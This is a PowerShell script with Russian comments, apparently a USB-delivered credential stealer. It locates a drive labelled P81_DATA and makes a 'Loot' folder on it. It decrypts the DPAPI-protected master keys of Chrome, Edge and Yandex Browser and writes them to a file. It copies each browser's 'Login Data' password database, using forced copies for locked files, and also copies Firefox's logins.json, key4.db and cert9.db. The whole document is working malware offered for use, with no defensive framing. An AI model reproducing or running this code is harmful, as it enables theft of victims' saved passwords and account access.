# 1. Поиск флешки P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

Add-Type -AssemblyName System.Security
$report = "$dest\KEYS_ALL.txt"

# 2. Массив браузеров
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        # Ключ (уже работает)
        $ls = Join-Path $b.p "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch {}
        }

        # Сбор баз через поиск
        Get-ChildItem -Path $b.p -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $targetName = "$($b.n)_$($_.Directory.Name)_DB.db"
            # Пробуем скопировать через CMD (агрессивный метод)
            cmd /c copy /y "`"$($_.FullName)`"" "`"$dest\$targetName`"" > $null
        }
    }
}

# 3. ПРЯМОЙ УДАР ПО ЯНДЕКСУ (по твоему пути)
$yandexDirect = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Login Data"
if (Test-Path $yandexDirect) {
    $yName = "YANDEX_DIRECT_Default_DB.db"
    # Попытка через FileStream (на случай блокировки)
    try {
        $source = [System.IO.File]::Open($yandexDirect, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $target = [System.IO.File]::Create("$dest\$yName")
        $source.CopyTo($target)
        $source.Close(); $target.Close()
    } catch {
        cmd /c copy /y "`"$yandexDirect`"" "`"$dest\$yName`"" > $null
    }
}

# 4. FIREFOX (logins.json, key4.db, cert9.db)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    Get-ChildItem $ffDir -Directory | ForEach-Object {
        $p = $_.Name
        foreach ($f in "logins.json", "key4.db", "cert9.db") {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) { Copy-Item $src -Destination "$dest\FIREFOX_$($p)_$f" -Force }
        }
    }
}

exit
